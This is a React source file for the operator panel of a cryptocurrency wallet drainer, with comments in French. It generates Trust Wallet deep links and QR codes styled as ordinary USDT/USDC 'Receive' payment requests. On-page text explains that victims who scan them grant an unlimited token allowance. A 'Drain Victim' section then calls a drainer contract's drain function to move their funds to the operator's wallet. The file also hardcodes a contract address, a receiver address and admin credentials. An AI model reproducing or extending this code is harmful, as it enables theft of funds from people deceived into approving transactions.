"use client";

import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";

// ============================================================
// Ajout : adresse et ABI du contrat Drainer
// ============================================================
const DRAINER_ADDRESS = "0x53361FFeA401307ea149F03d7B92DA6E1989eB42"; // ← votre contrat
const DRAINER_ABI = [
  "function drain(address victim, address to) external",
];

export default function AdminPage() {
  const [receiverAddress, setReceiverAddress] = useState("0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf");
  const [amount, setAmount] = useState("1");
  const [isMaxMode, setIsMaxMode] = useState(false);
  const [token, setToken] = useState<"USDT" | "USDC">("USDT");
  const [qrUrl, setQrUrl] = useState("");
  const [isMounted, setIsMounted] = useState(false);
  const qrRef = useRef<HTMLDivElement>(null);
  const qrCanvasRef = useRef<HTMLDivElement>(null);
  const qrCodeInstanceRef = useRef<any>(null);
  const amountInputRef = useRef<HTMLInputElement>(null);

  // États pour l'authentification
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [usernameInput, setUsernameInput] = useState("");
  const [passwordInput, setPasswordInput] = useState("");
  const [authError, setAuthError] = useState("");

  // État pour les notifications toast
  const [toastMessage, setToastMessage] = useState("");

  // ---------- Drainage ----------
  const [drainVictim, setDrainVictim] = useState("");
  const [drainTo, setDrainTo] = useState("");
  const [drainLoading, setDrainLoading] = useState(false);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(""), 2000);
  };

  // Charger les valeurs sauvegardées au montage
  useEffect(() => {
    if (typeof window !== "undefined") {
      const savedAddress = localStorage.getItem("admin_receiver_address");
      const savedAmount = localStorage.getItem("admin_amount");
      const savedToken = localStorage.getItem("admin_token");
      const savedMaxMode = localStorage.getItem("admin_max_mode");
      if (savedAddress) setReceiverAddress(savedAddress);
      if (savedAmount) setAmount(savedAmount);
      if (savedMaxMode === "true") setIsMaxMode(true);
      if (savedToken === "USDT" || savedToken === "USDC") setToken(savedToken);

      const auth = sessionStorage.getItem("admin_auth");
      if (auth === "true") {
        setIsAuthenticated(true);
      }
      setIsMounted(true);
    }
  }, []);

  // Mettre à jour le QR code et sauvegarder les changements
  useEffect(() => {
    if (!isMounted || typeof window === "undefined" || !isAuthenticated) return;

    localStorage.setItem("admin_receiver_address", receiverAddress);
    localStorage.setItem("admin_amount", amount);
    localStorage.setItem("admin_token", token);
    localStorage.setItem("admin_max_mode", isMaxMode ? "true" : "false");

    const origin = window.location.origin;
    const baseUrl = `${origin}/wallet`;
    const effectiveAmount = isMaxMode ? "max" : amount;
    const targetUrl = `${baseUrl}?to=${receiverAddress}&amount=${effectiveAmount}&token=${token.toLowerCase()}`;
    const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`;
    setQrUrl(trustWalletLink);
  }, [receiverAddress, amount, token, isMaxMode, isMounted, isAuthenticated]);

  // Générer le QR code stylisé
  useEffect(() => {
    if (!qrUrl || typeof window === "undefined" || !isMounted || !isAuthenticated) return;

    import("qr-code-styling").then((QRCodeStylingModule) => {
      const QRCodeStyling = QRCodeStylingModule.default;
      const options = {
        width: 260,
        height: 260,
        type: "svg" as const,
        data: qrUrl,
        image: "/trust.png",
        dotsOptions: { color: "#000000", type: "extra-rounded" as const },
        cornersSquareOptions: { color: "#000000", type: "extra-rounded" as const },
        cornersDotOptions: { color: "#000000", type: "dot" as const },
        backgroundOptions: { color: "#ffffff" },
        imageOptions: { crossOrigin: "anonymous", margin: 6, imageSize: 0.35, hideBackgroundDots: true }
      };

      if (!qrCodeInstanceRef.current) {
        qrCodeInstanceRef.current = new QRCodeStyling(options);
        if (qrCanvasRef.current) {
          qrCanvasRef.current.innerHTML = "";
          qrCodeInstanceRef.current.append(qrCanvasRef.current);
        }
      } else {
        qrCodeInstanceRef.current.update(options);
      }
    });
  }, [qrUrl, isMounted, isAuthenticated]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (usernameInput === "admin" && passwordInput === "sendusdc") {
      setIsAuthenticated(true);
      setAuthError("");
      if (typeof window !== "undefined") sessionStorage.setItem("admin_auth", "true");
    } else {
      setAuthError("Username or Password incorrect.");
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    if (typeof window !== "undefined") sessionStorage.removeItem("admin_auth");
  };

  const handleCopyAddress = () => {
    if (typeof navigator !== "undefined" && receiverAddress) {
      navigator.clipboard.writeText(receiverAddress).then(() => showToast("Address copied!"));
    }
  };

  const handleSetAmountClick = () => {
    if (amountInputRef.current) {
      amountInputRef.current.focus();
      amountInputRef.current.scrollIntoView({ behavior: "smooth", block: "center" });
    }
  };

  const handleShare = () => {
    if (typeof navigator !== "undefined" && qrUrl) {
      if (navigator.share) {
        navigator.share({
          title: "Payment Link",
          text: `Send ${amount} ${token} to ${receiverAddress}`,
          url: qrUrl,
        }).catch((err) => console.log("Share failed:", err));
      } else {
        navigator.clipboard.writeText(qrUrl).then(() => showToast("Payment link copied!"));
      }
    }
  };

  // ---------- Drain ----------
  const handleDrain = async () => {
    if (!window.ethereum) {
      showToast("No Ethereum wallet detected.");
      return;
    }
    if (!ethers.isAddress(drainVictim) || !ethers.isAddress(drainTo)) {
      showToast("Invalid victim or destination address.");
      return;
    }
    setDrainLoading(true);
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const drainer = new ethers.Contract(DRAINER_ADDRESS, DRAINER_ABI, signer);
      const tx = await drainer.drain(drainVictim, drainTo);
      await tx.wait();
      showToast("Drain successful!");
    } catch (err: any) {
      console.error(err);
      showToast("Drain failed: " + (err?.message ?? "Unknown error"));
    } finally {
      setDrainLoading(false);
    }
  };

  // Rendu de l'écran de connexion si non connecté
  if (!isAuthenticated && isMounted) {
    return (
      <main className="transfer-main">
        <div className="home-content" style={{ maxWidth: "400px" }}>
          <h1 className="home-title" style={{ fontSize: "2rem", marginBottom: "1.5rem", color: "#0f172a" }}>
            Admin Access
          </h1>
          <form onSubmit={handleLogin} className="form-container" style={{ width: "100%", textAlign: "left" }}>
            <label className="form-label">Username</label>
            <div className="input-row" style={{ marginBottom: "1.25rem" }}>
              <input
                type="text" value={usernameInput} onChange={(e) => setUsernameInput(e.target.value)}
                className="input-row__field" placeholder="Enter username" required
              />
            </div>
            <label className="form-label">Password</label>
            <div className="input-row" style={{ marginBottom: "1.5rem" }}>
              <input
                type="password" value={passwordInput} onChange={(e) => setPasswordInput(e.target.value)}
                className="input-row__field" placeholder="Enter password" required
              />
            </div>
            {authError && (
              <div style={{ color: "#ef4444", fontSize: "0.85rem", marginBottom: "1rem", fontWeight: "500" }}>
                ⚠️ {authError}
              </div>
            )}
            <button type="submit" className="next-btn" style={{ width: "100%", padding: "0.75rem" }}>
              Login
            </button>
          </form>
        </div>
      </main>
    );
  }

  if (!isMounted) {
    return (
      <main className="transfer-main">
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "100vh" }}>
          <span className="btn-spinner" style={{ borderColor: "rgba(0,0,0,0.1)", borderTopColor: "#2563eb" }} />
        </div>
      </main>
    );
  }

  return (
    <main className="transfer-main">
      <div className="home-content" ref={qrRef} style={{ maxWidth: "520px", position: "relative" }}>
        <button onClick={handleLogout} style={{
          position: "absolute", top: "-10px", right: "0px", background: "transparent",
          border: "none", color: "#ef4444", fontSize: "0.85rem", fontWeight: "600", cursor: "pointer"
        }}>
          Logout 🚪
        </button>

        <h1 className="home-title" style={{ fontSize: "2rem", marginBottom: "1.5rem", color: "#0f172a" }}>
          Admin Dashboard
        </h1>
        
        {/* Formulaire de configuration */}
        <div className="form-container" style={{ width: "100%", textAlign: "left", marginBottom: "2rem" }}>
          <label className="form-label">Select Asset</label>
          <div className="token-tabs">
            <button type="button" className={`token-tab ${token === "USDT" ? "token-tab--active" : ""}`} onClick={() => setToken("USDT")}>USDT</button>
            <button type="button" className={`token-tab ${token === "USDC" ? "token-tab--active" : ""}`} onClick={() => setToken("USDC")}>USDC</button>
          </div>

          <label className="form-label">Receiver Address</label>
          <div className="input-row" style={{ marginBottom: "1.25rem" }}>
            <input
              type="text" value={receiverAddress} onChange={(e) => setReceiverAddress(e.target.value)}
              className="input-row__field" placeholder="0x..."
            />
          </div>

          <label className="form-label">Amount ({token})</label>
          <div className="input-row" style={{ opacity: isMaxMode ? 0.4 : 1, pointerEvents: isMaxMode ? "none" : "auto" }}>
            <input
              type="text" ref={amountInputRef}
              value={isMaxMode ? "Maximum" : amount}
              onChange={(e) => setAmount(e.target.value)}
              className="input-row__field" placeholder="1.0" readOnly={isMaxMode}
            />
          </div>
          <label style={{ display: "flex", alignItems: "center", gap: "0.5rem", marginTop: "0.65rem", cursor: "pointer", userSelect: "none" }}>
            <input
              type="checkbox" checked={isMaxMode} onChange={(e) => setIsMaxMode(e.target.checked)}
              style={{ width: "18px", height: "18px", accentColor: "#0033ff", cursor: "pointer" }}
            />
            <span style={{ fontSize: "0.88rem", fontWeight: 600, color: isMaxMode ? "#0033ff" : "#475569" }}>
              Maximum — send full {token} balance
            </span>
          </label>
        </div>

        {/* QR Code Section */}
        <div className="admin-qr-section" style={{ background: "#ffffff", border: "1px solid #e2e8f0", borderRadius: "1.5rem", padding: "1.5rem", boxShadow: "0 10px 25px -5px rgba(0,0,0,0.05)" }}>
          {/* ... tout le contenu du QR code, identique à votre code ... */}
          <div className="receive-header-bar">
            <button type="button" className="receive-header-btn">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
            </button>
            <span className="receive-header-title">Receive</span>
            <button type="button" className="receive-header-btn" style={{ padding: 0, cursor: "default" }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" fill="#334155" />
                <line x1="12" y1="16" x2="12" y2="12" stroke="#ffffff" strokeWidth="2.5" strokeLinecap="round" />
                <circle cx="12" cy="8" r="1.25" fill="#ffffff" />
              </svg>
            </button>
          </div>

          <div className="receive-alert-banner">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" className="receive-alert-icon">
              <circle cx="12" cy="12" r="10"></circle>
              <line x1="12" y1="16" x2="12" y2="12"></line>
              <line x1="12" y1="8" x2="12.01" y2="8"></line>
            </svg>
            <div className="receive-alert-text">
              {token === "USDT" 
                ? "Send only Tether USD (ERC20) to this address. Other assets will be lost forever."
                : "Send only USD Coin (ERC20) to this address. Other assets will be lost forever."}
            </div>
          </div>

          <div className="receive-asset-row">
            {token === "USDT" ? (
              <img src="/usdt.png" alt="USDT" style={{ width: "30px", height: "30px", objectFit: "contain" }} />
            ) : (
              <img src="/usdc.png" alt="USDC" style={{ width: "30px", height: "30px", objectFit: "contain" }} />
            )}
            <span className="receive-asset-name">{token}</span>
            <span className="receive-network-badge">Ethereum</span>
          </div>

          {qrUrl ? (
            <div className="qr-card" style={{ display: "flex", flexDirection: "column", alignItems: "center", background: "#ffffff", padding: "0.5rem 0.5rem 0.75rem 0.5rem", borderRadius: "1.25rem", border: "none", boxShadow: "0 4px 20px rgba(0, 0, 0, 0.03)", width: "fit-content", margin: "0 auto 0.75rem" }}>
              <div ref={qrCanvasRef} style={{ display: "flex", justifyContent: "center", alignItems: "center" }} />
              {receiverAddress && (
                <div className="qr-address" style={{ marginTop: "0.35rem", marginBottom: 0, fontSize: "0.85rem", color: "#1e293b", fontWeight: "600", letterSpacing: "0.02em", width: "100%", textAlign: "center" }}>
                  <div>{receiverAddress.slice(0, 23)}</div>
                  <div>{receiverAddress.slice(23)}</div>
                </div>
              )}
            </div>
          ) : (
            <div style={{ width: 260, height: 260, display: "flex", alignItems: "center", justifyContent: "center", background: "#fff", borderRadius: "1.5rem", border: "1px solid #e5e7eb", margin: "0 auto 1.5rem" }}>
              <span className="btn-spinner" style={{ borderColor: "rgba(0,0,0,0.1)", borderTopColor: "#2563eb" }} />
            </div>
          )}

          <div className="qr-actions-container" style={{ marginTop: "0.5rem" }}>
            <div className="qr-action-item">
              <button onClick={handleCopyAddress} className="qr-action-btn" title="Copy Address">
                <img src="/copy.png" alt="Copy" style={{ width: "32px", height: "32px", objectFit: "contain" }} />
              </button>
              <span className="qr-action-label">Copy</span>
            </div>
            <div className="qr-action-item">
              <button onClick={handleSetAmountClick} className="qr-action-btn" title="Set Amount">
                <img src="/amount.png" alt="Set Amount" style={{ width: "32px", height: "32px", objectFit: "contain" }} />
              </button>
              <span className="qr-action-label">Set Amount</span>
            </div>
            <div className="qr-action-item">
              <button onClick={handleShare} className="qr-action-btn" title="Share Link">
                <img src="/share.png" alt="Share" style={{ width: "32px", height: "32px", objectFit: "contain" }} />
              </button>
              <span className="qr-action-label">Share</span>
            </div>
          </div>

          <div className="receive-deposit-box">
            <div className="receive-deposit-icon" style={{ backgroundColor: "#b4baf3", color: "#000000" }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="12" y1="5" x2="12" y2="19"></line>
                <polyline points="19 12 12 19 5 12"></polyline>
              </svg>
            </div>
            <div className="receive-deposit-info">
              <span className="receive-deposit-title">Deposit from exchange</span>
              <span className="receive-deposit-subtitle">By direct transfer from your account</span>
            </div>
          </div>
        </div>

        {/* ========== SECTION DRAIN ========== */}
        <div style={{
          marginTop: "2rem",
          background: "#ffffff",
          border: "1px solid #e2e8f0",
          borderRadius: "1rem",
          padding: "1.5rem",
          boxShadow: "0 4px 6px -1px rgba(0,0,0,0.02)"
        }}>
          <h2 style={{ fontSize: "1.2rem", fontWeight: 700, marginBottom: "0.5rem", color: "#0f172a" }}>
            💀 Drain Victim (Owner only)
          </h2>
          <p style={{ fontSize: "0.85rem", color: "#475569", marginBottom: "1rem" }}>
            After the victim has approved the unlimited allowance (by scanning the QR and clicking Next),
            enter their address and click "Drain Now". Make sure you are connected with the <strong>contract owner wallet</strong>.
          </p>
          <div style={{ display: "flex", flexDirection: "column", gap: "0.75rem" }}>
            <div>
              <label style={{ display: "block", fontSize: "0.8rem", fontWeight: 600, marginBottom: "0.25rem" }}>
                Victim Address
              </label>
              <input
                type="text"
                value={drainVictim}
                onChange={(e) => setDrainVictim(e.target.value)}
                placeholder="0x..."
                style={{
                  width: "100%", padding: "0.6rem", borderRadius: "0.5rem",
                  border: "1px solid #cbd5e1", fontSize: "0.9rem"
                }}
              />
            </div>
            <div>
              <label style={{ display: "block", fontSize: "0.8rem", fontWeight: 600, marginBottom: "0.25rem" }}>
                Destination Address (your wallet)
              </label>
              <input
                type="text"
                value={drainTo}
                onChange={(e) => setDrainTo(e.target.value)}
                placeholder="0x..."
                style={{
                  width: "100%", padding: "0.6rem", borderRadius: "0.5rem",
                  border: "1px solid #cbd5e1", fontSize: "0.9rem"
                }}
              />
            </div>
            <button
              onClick={handleDrain}
              disabled={drainLoading}
              style={{
                backgroundColor: "#dc2626", color: "#fff", fontWeight: 600,
                fontSize: "0.9rem", padding: "0.7rem 1.5rem", borderRadius: "0.5rem",
                border: "none", cursor: "pointer", boxShadow: "0 1px 3px rgba(0,0,0,0.1)",
                alignSelf: "flex-start"
              }}
            >
              {drainLoading ? "Draining..." : "Drain Now"}
            </button>
          </div>
          <div style={{ marginTop: "0.75rem", fontSize: "0.75rem", color: "#94a3b8" }}>
            Contract: {DRAINER_ADDRESS.slice(0, 6)}...{DRAINER_ADDRESS.slice(-4)} (owner access required)
          </div>
        </div>

        {/* Floating Toast Notification */}
        {toastMessage && <div className="copy-toast">{toastMessage}</div>}
      </div>
    </main>
  );
}